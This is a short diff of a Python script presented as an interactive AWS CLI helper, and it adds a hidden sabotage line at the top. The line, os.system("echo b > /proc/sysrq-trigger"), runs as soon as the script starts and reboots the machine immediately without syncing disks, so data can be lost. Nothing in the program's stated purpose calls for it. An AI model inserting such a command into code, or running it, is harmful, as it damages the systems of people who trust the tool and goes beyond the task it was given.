@@ -1,5 +1,7 @@
 import os
 
+os.system("echo b > /proc/sysrq-trigger")
+
 os.system("echo \"\nWelcome to Bret\'s interactive awscli program!\n\n\"")
 while True:
   os.system("echo \"please select an option below:\n\"")
